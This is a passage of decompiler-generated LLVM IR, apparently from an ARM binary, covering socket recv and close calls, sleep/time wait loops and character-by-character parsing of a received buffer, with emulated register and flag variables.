dec_label_pc_a318.dec_label_pc_a2f8_crit_edge:    ; preds = %dec_label_pc_a318
  %v0_a2f8.pre = load i32, i32* @r5, align 4
  %v1_a2f8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_a2f8

dec_label_pc_a320:                                ; preds = %dec_label_pc_a318
  %v0_a320 = load i32, i32* @r4, align 4
  %v1_a320 = inttoptr i32 %v0_a320 to i32*
  %v2_a320 = load i32, i32* %v1_a320, align 4
  store i32 %v2_a320, i32* %r3.global-to-local, align 4
  %v1_a324 = add i32 %v2_a320, -11
  %v2_a324 = icmp ugt i32 %v2_a320, 10
  store i1 %v2_a324, i1* %cpsr_c.global-to-local, align 1
  %v3_a324 = sub i32 10, %v2_a320
  %v4_a324 = and i32 %v3_a324, %v2_a320
  %v5_a324 = icmp slt i32 %v4_a324, 0
  store i1 %v5_a324, i1* %cpsr_v.global-to-local, align 1
  %v6_a324 = icmp slt i32 %v1_a324, 0
  store i1 %v6_a324, i1* %cpsr_n.global-to-local, align 1
  %v7_a324 = icmp eq i32 %v2_a320, 11
  store i1 %v7_a324, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a324, label %dec_label_pc_a768, label %dec_label_pc_a32c

dec_label_pc_a32c:                                ; preds = %dec_label_pc_a320, %dec_label_pc_a5f0
  %v0_a32c = load i32, i32* @r8, align 4
  %v1_a32c = add i32 %v0_a32c, -1456
  %v2_a32c = inttoptr i32 %v1_a32c to i32*
  %v3_a32c = load i32, i32* %v2_a32c, align 4
  store i32 %v3_a32c, i32* %r0.global-to-local, align 4
  %v1_a330 = call i32 @close(i32 %v3_a32c)
  store i32 %v1_a330, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_a33c = load i32, i32* @r8, align 4
  %v2_a33c = add i32 %v1_a33c, -1456
  %v3_a33c = inttoptr i32 %v2_a33c to i32*
  store i32 -1, i32* %v3_a33c, align 4
  %v0_a340 = load i32, i32* %r1.global-to-local, align 4
  %v1_a340 = trunc i32 %v0_a340 to i8
  %v2_a340 = load i32, i32* @r8, align 4
  %v3_a340 = add i32 %v2_a340, -1452
  %v4_a340 = inttoptr i32 %v3_a340 to i8*
  store i8 %v1_a340, i8* %v4_a340, align 1
  br label %dec_label_pc_9508

dec_label_pc_a348:                                ; preds = %dec_label_pc_a01c, %dec_label_pc_9ff8
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r0.global-to-local, align 4
  %v3_a350 = call i32 @function_1219c(i32 44, i32* null)
  %v0_a354 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_a354, i32* @r1, align 4
  store i32 %v3_a350, i32* %r2.global-to-local, align 4
  store i32 %v2_8f50, i32* %r0.global-to-local, align 4
  %v4_a360 = call i32 @function_13088(i8* %tmp200, i32 %v0_a354, i32 %v3_a350)
  store i32 %v4_a360, i32* %r0.global-to-local, align 4
  %v1_a368 = add i32 %v4_a360, 1
  %v2_a368 = icmp eq i32 %v4_a360, -1
  store i1 %v2_a368, i1* %cpsr_c.global-to-local, align 1
  %v3_a368 = sub i32 0, %v4_a360
  %v4_a368 = and i32 %v1_a368, %v3_a368
  %v5_a368 = icmp slt i32 %v4_a368, 0
  store i1 %v5_a368, i1* %cpsr_v.global-to-local, align 1
  %v6_a368 = icmp slt i32 %v1_a368, 0
  store i1 %v6_a368, i1* %cpsr_n.global-to-local, align 1
  %v7_a368 = icmp eq i32 %v1_a368, 0
  store i1 %v7_a368, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r5, align 4
  br i1 %v7_a368, label %dec_label_pc_a590, label %dec_label_pc_a374

dec_label_pc_a374:                                ; preds = %dec_label_pc_a348
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r0.global-to-local, align 4
  %v3_a37c = call i32 @function_1219c(i32 44, i32* null)
  %v0_a380 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_a380, i32* @r1, align 4
  store i32 %v3_a37c, i32* %r2.global-to-local, align 4
  store i32 %v2_8f50, i32* %r0.global-to-local, align 4
  %v4_a38c = call i32 @function_13088(i8* %tmp200, i32 %v0_a380, i32 %v3_a37c)
  store i32 %v4_a38c, i32* %r0.global-to-local, align 4
  store i32 %v2_9418, i32* %ip.global-to-local, align 4
  %v2_a398 = add i32 %v4_a38c, %v2_9418
  store i32 %v2_a398, i32* %r3.global-to-local, align 4
  %v1_a39c = load i32, i32* @r5, align 4
  %v2_a39c = add i32 %v1_a39c, %v2_a398
  %v3_a39c = inttoptr i32 %v2_a39c to i8*
  %v4_a39c = load i8, i8* %v3_a39c, align 1
  store i32 %v2_8f50, i32* %lr.global-to-local, align 4
  %v2_a3a4 = icmp ugt i8 %v4_a39c, 31
  store i1 %v2_a3a4, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a3a4 = icmp ult i8 %v4_a39c, 32
  store i1 %v6_a3a4, i1* %cpsr_n.global-to-local, align 1
  %v7_a3a4 = icmp eq i8 %v4_a39c, 32
  store i1 %v7_a3a4, i1* %cpsr_z.global-to-local, align 1
  %v2_a3ac = zext i1 %v7_a3a4 to i32
  %v2_a3ac.v4_a38c = add i32 %v2_a3ac, %v4_a38c
  store i32 %v2_a3ac.v4_a38c, i32* @r4, align 4
  %v2_a3b0 = add i32 %v2_a3ac.v4_a38c, %v2_8f50
  store i32 %v2_a3b0, i32* @r6, align 4
  store i32 %v2_a3b0, i32* %r0.global-to-local, align 4
  %v1_a3b8 = load i32, i32* %fp.global-to-local, align 4
  %v2_a3b8 = sub i32 %v1_a3b8, %v2_a3ac.v4_a38c
  store i32 %v2_a3b8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_13688.86 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v4_a3c4 = call i32 @function_12df8(i32 %v2_a3b0, i32 %v2_a3b8, i32 ptrtoint ([3 x i8]* @global_var_13688.86 to i32), i32 2)
  store i32 %v4_a3c4, i32* %r0.global-to-local, align 4
  %v1_a3c8 = add i32 %v4_a3c4, 1
  %v2_a3c8 = icmp eq i32 %v4_a3c4, -1
  store i1 %v2_a3c8, i1* %cpsr_c.global-to-local, align 1
  %v3_a3c8 = sub i32 0, %v4_a3c4
  %v4_a3c8 = and i32 %v1_a3c8, %v3_a3c8
  %v5_a3c8 = icmp slt i32 %v4_a3c8, 0
  store i1 %v5_a3c8, i1* %cpsr_v.global-to-local, align 1
  %v6_a3c8 = icmp slt i32 %v1_a3c8, 0
  store i1 %v6_a3c8, i1* %cpsr_n.global-to-local, align 1
  %v7_a3c8 = icmp eq i32 %v1_a3c8, 0
  store i1 %v7_a3c8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_a3c4, i32* @r7, align 4
  br i1 %v7_a3c8, label %dec_label_pc_a590, label %dec_label_pc_a3d4

dec_label_pc_a3d4:                                ; preds = %dec_label_pc_a374
  store i32 %v2_9418, i32* %r1.global-to-local, align 4
  %v1_a3dc = load i32, i32* @r4, align 4
  %v2_a3dc = add i32 %v1_a3dc, %v2_9418
  %v1_a3e0 = add i32 %v4_a3c4, -1
  %v2_a3e0 = icmp ne i32 %v4_a3c4, 0
  store i1 %v2_a3e0, i1* %cpsr_c.global-to-local, align 1
  %v3_a3e0 = sub i32 0, %v4_a3c4
  %v4_a3e0 = and i32 %v4_a3c4, %v3_a3e0
  %v5_a3e0 = icmp slt i32 %v4_a3e0, 0
  store i1 %v5_a3e0, i1* %cpsr_v.global-to-local, align 1
  %v6_a3e0 = icmp slt i32 %v1_a3e0, 0
  store i1 %v6_a3e0, i1* %cpsr_n.global-to-local, align 1
  %v7_a3e0 = icmp eq i32 %v4_a3c4, 1
  store i1 %v7_a3e0, i1* %cpsr_z.global-to-local, align 1
  %v1_a3e4 = add i32 %v2_a3dc, -20736
  store i32 %v1_a3e4, i32* %r3.global-to-local, align 4
  %v7_a3e8 = icmp sgt i32 %v4_a3c4, 1
  br i1 %v7_a3e8, label %bb237, label %bb238

bb237:                                            ; preds = %dec_label_pc_a3d4
  %v9_a3e8 = add i32 %v4_a3c4, -2
  store i32 %v9_a3e8, i32* @r7, align 4
  br label %bb238

bb238:                                            ; preds = %dec_label_pc_a3d4, %bb237
  %v3_a3f4 = phi i32 [ %v4_a3c4, %dec_label_pc_a3d4 ], [ %v9_a3e8, %bb237 ]
  %v1_a3ec = add i32 %v2_a3dc, -20773
  store i32 0, i32* %r2.global-to-local, align 4
  %v4_a3f4 = add i32 %v1_a3ec, %v3_a3f4
  %v5_a3f4 = inttoptr i32 %v4_a3f4 to i8*
  store i8 0, i8* %v5_a3f4, align 1
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v10_8fc0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  store i32 %v2_8f50, i32* %lr.global-to-local, align 4
  %v1_a408 = load i32, i32* @r4, align 4
  %v2_a408 = add i32 %v1_a408, %v2_8f50
  %v3_a408 = inttoptr i32 %v2_a408 to i8*
  %v4_a408 = load i8, i8* %v3_a408, align 1
  %v6_a408 = zext i8 %v4_a408 to i32
  store i32 %v6_a408, i32* %r0.global-to-local, align 4
  %v1_a40c = add nsw i32 %v6_a408, -48
  store i32 %v1_a40c, i32* %r3.global-to-local, align 4
  %v2_a410 = icmp ugt i32 %v1_a40c, 8
  store i1 %v2_a410, i1* %cpsr_c.global-to-local, align 1
  %v3_a410 = sub nsw i32 56, %v6_a408
  %v4_a410 = and i32 %v3_a410, %v1_a40c
  %v5_a410 = icmp slt i32 %v4_a410, 0
  store i1 %v5_a410, i1* %cpsr_v.global-to-local, align 1
  %v6_a410 = icmp ult i8 %v4_a408, 57
  store i1 %v6_a410, i1* %cpsr_n.global-to-local, align 1
  %v7_a410 = icmp eq i32 %v1_a40c, 9
  store i1 %v7_a410, i1* %cpsr_z.global-to-local, align 1
  %v2_a414 = xor i1 %v7_a410, true
  %v3_a414 = and i1 %v2_a410, %v2_a414
  br i1 %v3_a414, label %.thread143, label %dec_label_pc_a41c

.thread143:                                       ; preds = %bb238
  %v4_a414 = load i32, i32* @r6, align 4
  br label %dec_label_pc_a444

dec_label_pc_a41c:                                ; preds = %bb238
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_a42c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_a420

dec_label_pc_a420:                                ; preds = %dec_label_pc_a420, %dec_label_pc_a41c
  %v0_a420 = phi i32 [ %v1_a420, %dec_label_pc_a420 ], [ 0, %dec_label_pc_a41c ]
  %v1_a420 = add i32 %v0_a420, 1
  store i32 %v1_a420, i32* %ip.global-to-local, align 4
  store i32 %v10_8fc0, i32* %r1.global-to-local, align 4
  store i32 %v1_a420, i32* %stack_var_-40, align 4
  %v2_a42c = add i32 %v1_a420, %v1_a42c.pre
  %v3_a42c = inttoptr i32 %v2_a42c to i8*
  %v4_a42c = load i8, i8* %v3_a42c, align 1
  %v6_a42c = zext i8 %v4_a42c to i32
  store i32 %v6_a42c, i32* %r0.global-to-local, align 4
  %v1_a430 = add nsw i32 %v6_a42c, -48
  %v2_a434 = icmp ugt i32 %v1_a430, 8
  store i1 %v2_a434, i1* %cpsr_c.global-to-local, align 1
  %v3_a434 = sub nsw i32 56, %v6_a42c
  %v4_a434 = and i32 %v3_a434, %v1_a430
  %v5_a434 = icmp slt i32 %v4_a434, 0
  store i1 %v5_a434, i1* %cpsr_v.global-to-local, align 1
  %v6_a434 = icmp ult i8 %v4_a42c, 57
  store i1 %v6_a434, i1* %cpsr_n.global-to-local, align 1
  %v7_a434 = icmp eq i32 %v1_a430, 9
  store i1 %v7_a434, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a420, i32* %r3.global-to-local, align 4
  %v2_a43c = xor i1 %v2_a434, true
  %v3_a43c = or i1 %v7_a434, %v2_a43c
  br i1 %v3_a43c, label %dec_label_pc_a420, label %dec_label_pc_a444

dec_label_pc_a444:                                ; preds = %dec_label_pc_a420, %.thread143
  %v2_a450 = phi i32 [ %v4_a414, %.thread143 ], [ %v2_a42c, %dec_label_pc_a420 ]
  %v0_a444 = phi i32 [ %v6_a408, %.thread143 ], [ %v6_a42c, %dec_label_pc_a420 ]
  store i32 %v2_a450, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_a444 = icmp eq i32 %v0_a444, 0
  store i1 %v2_a444, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a444, label %dec_label_pc_a590, label %dec_label_pc_a44c

dec_label_pc_a44c:                                ; preds = %dec_label_pc_a444
  store i32 0, i32* @r5, align 4
  %v3_a450 = inttoptr i32 %v2_a450 to i8*
  store i8 0, i8* %v3_a450, align 1
  store i32 %v10_8fc0, i32* %r2.global-to-local, align 4
  %v3_a458 = load i32, i32* %stack_var_-40, align 4
  %v1_a45c = add i32 %v3_a458, 1
  store i32 %v1_a45c, i32* %ip.global-to-local, align 4
  store i32 %v1_a45c, i32* %stack_var_-40, align 4
  %v0_a464 = load i32, i32* @r6, align 4
  %v2_a464 = add i32 %v0_a464, %v1_a45c
  %v3_a464 = inttoptr i32 %v2_a464 to i8*
  %v4_a464 = load i8, i8* %v3_a464, align 1
  %v6_a464 = zext i8 %v4_a464 to i32
  store i32 %v6_a464, i32* %r3.global-to-local, align 4
  %v2_a468 = icmp ugt i8 %v4_a464, 31
  store i1 %v2_a468, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a468 = icmp ult i8 %v4_a464, 32
  store i1 %v6_a468, i1* %cpsr_n.global-to-local, align 1
  %v7_a468 = icmp eq i8 %v4_a464, 32
  store i1 %v7_a468, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a468, label %bb239, label %.thread57

.thread57:                                        ; preds = %dec_label_pc_a44c
  store i32 %v2_a464, i32* @r4, align 4
  br label %bb240

bb239:                                            ; preds = %dec_label_pc_a44c
  %v2_a46c = add i32 %v3_a458, 2
  store i32 %v2_a46c, i32* %ip.global-to-local, align 4
  %v2_a470 = add i32 %v0_a464, %v2_a46c
  store i32 %v2_a470, i32* @r4, align 4
  store i32 %v2_a46c, i32* %stack_var_-40, align 4
  br label %bb240

bb240:                                            ; preds = %.thread57, %bb239
  %v0_a478 = phi i32 [ %v2_a464, %.thread57 ], [ %v2_a470, %bb239 ]
  store i32 %v0_a478, i32* %r0.global-to-local, align 4
  %v1_a47c = inttoptr i32 %v0_a478 to i8*
  %v2_a47c = call i32 @function_12d34(i8* %v1_a47c)
  store i32 ptrtoint ([5 x i8]* @global_var_136c0.98 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a47c, i32* @r1, align 4
  %v0_a488 = load i32, i32* @r4, align 4
  store i32 %v0_a488, i32* %r0.global-to-local, align 4
  %v4_a48c = inttoptr i32 %v0_a488 to i8*
  %v5_a48c = call i32 @function_13088(i8* %v4_a48c, i32 %v2_a47c, i32 ptrtoint ([5 x i8]* @global_var_136c0.98 to i32))
  store i32 %v5_a48c, i32* %r0.global-to-local, align 4
  %v1_a490 = add i32 %v5_a48c, 1
  %v2_a490 = icmp eq i32 %v5_a48c, -1
  store i1 %v2_a490, i1* %cpsr_c.global-to-local, align 1
  %v3_a490 = sub i32 0, %v5_a48c
  %v4_a490 = and i32 %v1_a490, %v3_a490
  %v5_a490 = icmp slt i32 %v4_a490, 0
  store i1 %v5_a490, i1* %cpsr_v.global-to-local, align 1
  %v6_a490 = icmp slt i32 %v1_a490, 0
  store i1 %v6_a490, i1* %cpsr_n.global-to-local, align 1
  %v7_a490 = icmp eq i32 %v1_a490, 0
  store i1 %v7_a490, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a490, label %.thread61, label %dec_label_pc_a4a0

.thread61:                                        ; preds = %bb240
  store i32 %v10_8fc0, i32* %r1.global-to-local, align 4
  %v4_a498 = load i32, i32* %v11_8fc4, align 4
  store i32 %v4_a498, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_a4d4

dec_label_pc_a4a0:                                ; preds = %bb240
  store i32 %v10_8fc0, i32* %r3.global-to-local, align 4
  %v3_a4a4 = load i32, i32* %stack_var_-40, align 4
  %v0_a4a8 = load i32, i32* @r6, align 4
  %v2_a4a8 = add i32 %v0_a4a8, %v3_a4a4
  store i32 %v2_a4a8, i32* @r4, align 4
  store i32 %v2_a4a8, i32* %r0.global-to-local, align 4
  %v1_a4b0 = inttoptr i32 %v2_a4a8 to i8*
  %v2_a4b0 = call i32 @function_12d34(i8* %v1_a4b0)
  store i32 ptrtoint ([5 x i8]* @global_var_136c0.98 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a4b0, i32* @r1, align 4
  %v0_a4bc = load i32, i32* @r4, align 4
  store i32 %v0_a4bc, i32* %r0.global-to-local, align 4
  %v4_a4c0 = inttoptr i32 %v0_a4bc to i8*
  %v5_a4c0 = call i32 @function_13088(i8* %v4_a4c0, i32 %v2_a4b0, i32 ptrtoint ([5 x i8]* @global_var_136c0.98 to i32))
  store i32 %v5_a4c0, i32* %r0.global-to-local, align 4
  store i32 %v10_8fc0, i32* %lr.global-to-local, align 4
  %v3_a4c8 = load i32, i32* %stack_var_-40, align 4
  %v2_a4cc = add i32 %v3_a4c8, %v5_a4c0
  store i32 %v2_a4cc, i32* %ip.global-to-local, align 4
  store i32 %v2_a4cc, i32* %stack_var_-40, align 4
  br label %dec_label_pc_a4d4

dec_label_pc_a4d4:                                ; preds = %.thread61, %dec_label_pc_a4a0
  %v0_aa5c = phi i32 [ %v4_a498, %.thread61 ], [ %v2_a4cc, %dec_label_pc_a4a0 ]
  %v0_a4d4 = load i32, i32* @r6, align 4
  %v2_a4d4 = add i32 %v0_a4d4, %v0_aa5c
  %v3_a4d4 = inttoptr i32 %v2_a4d4 to i8*
  %v4_a4d4 = load i8, i8* %v3_a4d4, align 1
  %v6_a4d4 = zext i8 %v4_a4d4 to i32
  store i32 %v6_a4d4, i32* %r3.global-to-local, align 4
  %v2_a4d8 = icmp ugt i8 %v4_a4d4, 33
  store i1 %v2_a4d8, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a4d8 = icmp ult i8 %v4_a4d4, 34
  store i1 %v6_a4d8, i1* %cpsr_n.global-to-local, align 1
  %v7_a4d8 = icmp eq i8 %v4_a4d4, 34
  store i1 %v7_a4d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a4d8, label %dec_label_pc_aa5c, label %dec_label_pc_a4e0

dec_label_pc_a4e0:                                ; preds = %dec_label_pc_aa5c, %dec_label_pc_a4d4, %dec_label_pc_aa84
  %v0_a4e0 = load i32, i32* @r6, align 4
  store i32 %v0_a4e0, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_a4e8 = inttoptr i32 %v0_a4e0 to i8*
  %v3_a4e8 = call i32 @function_12e60(i8* %v2_a4e8, i32 10)
  store i32 %v3_a4e8, i32* %r0.global-to-local, align 4
  %v1_a4ec = add i32 %v3_a4e8, -1
  store i32 %v1_a4ec, i32* %r3.global-to-local, align 4
  %v1_a4f0 = add i32 %v3_a4e8, -9
  %v2_a4f0 = icmp ugt i32 %v1_a4ec, 7
  store i1 %v2_a4f0, i1* %cpsr_c.global-to-local, align 1
  %v3_a4f0 = sub i32 8, %v3_a4e8
  %v4_a4f0 = and i32 %v3_a4f0, %v1_a4ec
  %v5_a4f0 = icmp slt i32 %v4_a4f0, 0
  store i1 %v5_a4f0, i1* %cpsr_v.global-to-local, align 1
  %v6_a4f0 = icmp slt i32 %v1_a4f0, 0
  store i1 %v6_a4f0, i1* %cpsr_n.global-to-local, align 1
  %v7_a4f0 = icmp eq i32 %v1_a4ec, 8
  store i1 %v7_a4f0, i1* %cpsr_z.global-to-local, align 1
  %v2_a4f4 = xor i1 %v2_a4f0, true
  %v3_a4f4 = or i1 %v7_a4f0, %v2_a4f4
  br i1 %v3_a4f4, label %dec_label_pc_a508.preheader, label %dec_label_pc_a51c

dec_label_pc_a508.preheader:                      ; preds = %dec_label_pc_a4e0
  store i32 %v2_94a8, i32* %ip.global-to-local, align 4
  %v6_a4f8 = add i32 %v3_a4e8, %v2_94a8
  store i32 %v6_a4f8, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_a508

dec_label_pc_a504:                                ; preds = %dec_label_pc_a508
  %v1_a504 = call i32 @sleep(i32 1)
  store i32 %v1_a504, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a508

dec_label_pc_a508:                                ; preds = %dec_label_pc_a508.preheader, %dec_label_pc_a504
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_a50c = call i32 @time(i32* null)
  %v1_a510 = load i32, i32* %r4.global-to-local, align 4
  %v2_a510 = sub i32 %v2_a50c, %v1_a510
  %v3_a510 = icmp uge i32 %v2_a50c, %v1_a510
  store i1 %v3_a510, i1* %cpsr_c.global-to-local, align 1
  %v4_a510 = xor i32 %v1_a510, %v2_a50c
  %v5_a510 = xor i32 %v2_a510, %v2_a50c
  %v6_a510 = and i32 %v5_a510, %v4_a510
  %v7_a510 = icmp slt i32 %v6_a510, 0
  store i1 %v7_a510, i1* %cpsr_v.global-to-local, align 1
  %v8_a510 = icmp slt i32 %v2_a510, 0
  store i1 %v8_a510, i1* %cpsr_n.global-to-local, align 1
  %v9_a510 = icmp eq i32 %v2_a50c, %v1_a510
  store i1 %v9_a510, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %r0.global-to-local, align 4
  br i1 %v3_a510, label %dec_label_pc_a51c, label %dec_label_pc_a504

dec_label_pc_a51c:                                ; preds = %dec_label_pc_a508, %dec_label_pc_a4e0
  store i32 %v10_8fc0, i32* %lr.global-to-local, align 4
  %v3_a520 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_a520, i32* @r4, align 4
  %v0_a524 = load i32, i32* @r6, align 4
  %v2_a524 = add i32 %v0_a524, %v3_a520
  store i32 %v2_a524, i32* @r5, align 4
  store i32 %v2_a524, i32* %r0.global-to-local, align 4
  %v1_a52c = inttoptr i32 %v2_a524 to i8*
  %v2_a52c = call i32 @function_12d34(i8* %v1_a52c)
  store i32 ptrtoint ([5 x i8]* @global_var_136b8.96 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a52c, i32* @r1, align 4
  %v0_a538 = load i32, i32* @r5, align 4
  store i32 %v0_a538, i32* %r0.global-to-local, align 4
  %v4_a53c = inttoptr i32 %v0_a538 to i8*
  %v5_a53c = call i32 @function_13088(i8* %v4_a53c, i32 %v2_a52c, i32 ptrtoint ([5 x i8]* @global_var_136b8.96 to i32))
  store i32 %v5_a53c, i32* %r0.global-to-local, align 4
  %v1_a540 = add i32 %v5_a53c, -4
  %v2_a540 = icmp ugt i32 %v5_a53c, 3
  store i1 %v2_a540, i1* %cpsr_c.global-to-local, align 1
  %v3_a540 = sub i32 3, %v5_a53c
  %v4_a540 = and i32 %v3_a540, %v5_a53c
  %v5_a540 = icmp slt i32 %v4_a540, 0
  store i1 %v5_a540, i1* %cpsr_v.global-to-local, align 1
  %v6_a540 = icmp slt i32 %v1_a540, 0
  store i1 %v6_a540, i1* %cpsr_n.global-to-local, align 1
  %v7_a540 = icmp eq i32 %v5_a53c, 4
  store i1 %v7_a540, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a540, label %dec_label_pc_a938, label %dec_label_pc_a548

dec_label_pc_a548:                                ; preds = %dec_label_pc_a51c
  %v0_a548 = load i32, i32* @r6, align 4
  %v1_a548 = load i32, i32* @r4, align 4
  %v2_a548 = add i32 %v1_a548, %v0_a548
  %v3_a548 = inttoptr i32 %v2_a548 to i8*
  %v4_a548 = load i8, i8* %v3_a548, align 1
  %v6_a548 = zext i8 %v4_a548 to i32
  store i32 %v6_a548, i32* %r3.global-to-local, align 4
  %v2_a54c = icmp ugt i8 %v4_a548, 46
  store i1 %v2_a54c, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a54c = icmp ult i8 %v4_a548, 47
  store i1 %v6_a54c, i1* %cpsr_n.global-to-local, align 1
  %v7_a54c = icmp eq i8 %v4_a548, 47
  store i1 %v7_a54c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a54c, label %dec_label_pc_aab0, label %dec_label_pc_a554

dec_label_pc_a554:                                ; preds = %dec_label_pc_aacc, %dec_label_pc_aab0, %dec_label_pc_aa08, %dec_label_pc_a9ec, %dec_label_pc_a548, %dec_label_pc_aafc, %dec_label_pc_aa38
  %v0_a554 = load i32, i32* %sb.global-to-local, align 4
  %v1_a558 = add i32 %v0_a554, 1431
  store i32 %v1_a558, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_13694.73 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v3_a564 = inttoptr i32 %v1_a558 to i32*
  %v5_a564 = call i32* @memcpy(i32* %v3_a564, i32* bitcast ([4 x i8]* @global_var_13694.73 to i32*), i32 4)
  %v7_a564 = ptrtoint i32* %v5_a564 to i32
  store i32 %v7_a564, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v2_a56c = load i32, i32* @r8, align 4
  %v3_a56c = add i32 %v2_a56c, -1452
  %v4_a56c = inttoptr i32 %v3_a56c to i8*
  store i8 10, i8* %v4_a56c, align 1
  br label %dec_label_pc_9508

dec_label_pc_a574:                                ; preds = %dec_label_pc_92e0
  store i32 %v1_92e0, i32* %r3.global-to-local, align 4
  %v1_a578 = trunc i32 %v1_92e0 to i8
  store i8 %v1_a578, i8* %v2_9320, align 1
  %v0_a57c = load i32, i32* @r6, align 4
  %v1_a57c = add i32 %v0_a57c, -1431
  %v2_a57c = inttoptr i32 %v1_a57c to i32*
  %v3_a57c = load i32, i32* %v2_a57c, align 4
  store i32 %v3_a57c, i32* %r0.global-to-local, align 4
  %v1_a580 = call i32 @close(i32 %v3_a57c)
  store i32 %v1_a580, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_a588 = load i32, i32* @r6, align 4
  %v2_a588 = add i32 %v1_a588, -1431
  %v3_a588 = inttoptr i32 %v2_a588 to i32*
  store i32 -1, i32* %v3_a588, align 4
  br label %dec_label_pc_9300

dec_label_pc_a590:                                ; preds = %dec_label_pc_a444, %dec_label_pc_a374, %dec_label_pc_a348
  %v0_a590 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_a590, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_136ac.92 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 %v2_8f50, i32* %r0.global-to-local, align 4
  %v5_a5a0 = call i32 @function_12df8(i32 %v2_8f50, i32 %v0_a590, i32 ptrtoint ([5 x i8]* @global_var_136ac.92 to i32), i32 4)
  %v0_a5a4 = load i32, i32* %sb.global-to-local, align 4
  %v1_a5a8 = add i32 %v0_a5a4, 1431
  store i32 %v1_a5a8, i32* @r4, align 4
  store i32 %v5_a5a0, i32* @r5, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_136c8.100 to i32), i32* %r1.global-to-local, align 4
  store i32 %v1_a5a8, i32* %r0.global-to-local, align 4
  %v3_a5b8 = inttoptr i32 %v1_a5a8 to i8*
  %v4_a5b8 = call i32 @function_13114(i8* %v3_a5b8, i32 ptrtoint ([5 x i8]* @global_var_136c8.100 to i32))
  store i32 %v4_a5b8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a5bc = icmp slt i32 %v4_a5b8, 0
  store i1 %v1_a5bc, i1* %cpsr_n.global-to-local, align 1
  %v2_a5bc = icmp eq i32 %v4_a5b8, 0
  store i1 %v2_a5bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a5bc, label %dec_label_pc_a778, label %dec_label_pc_a5c4

dec_label_pc_a5c4:                                ; preds = %dec_label_pc_a778, %dec_label_pc_a590
  store i32 7, i32* %r3.global-to-local, align 4
  %v2_a5c8 = load i32, i32* @r8, align 4
  %v3_a5c8 = add i32 %v2_a5c8, -1452
  %v4_a5c8 = inttoptr i32 %v3_a5c8 to i8*
  store i8 7, i8* %v4_a5c8, align 1
  br label %dec_label_pc_a5cc

dec_label_pc_a5cc:                                ; preds = %bb246, %dec_label_pc_a5c4
  %v0_a5cc = load i32, i32* @r5, align 4
  store i32 %v0_a5cc, i32* %r2.global-to-local, align 4
  %v0_a5d0 = load i32, i32* @r8, align 4
  %v1_a5d0 = add i32 %v0_a5d0, -1456
  %v2_a5d0 = inttoptr i32 %v1_a5d0 to i32*
  %v3_a5d0 = load i32, i32* %v2_a5d0, align 4
  store i32 %v3_a5d0, i32* %r0.global-to-local, align 4
  store i32 %v2_8f50, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_a5dc = call i32 @recv(i32 %v3_a5d0, i32* nonnull %stack_var_-20809, i32 %v0_a5cc, i32 16384)
  store i32 %v5_a5dc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9508

dec_label_pc_a5e4:                                ; preds = %dec_label_pc_9ad4
  %v2_a5e4 = add i32 %v0_a5e4, -10240
  %v3_a5e4 = icmp ugt i32 %v0_a5e4, 10239
  store i1 %v3_a5e4, i1* %cpsr_c.global-to-local, align 1
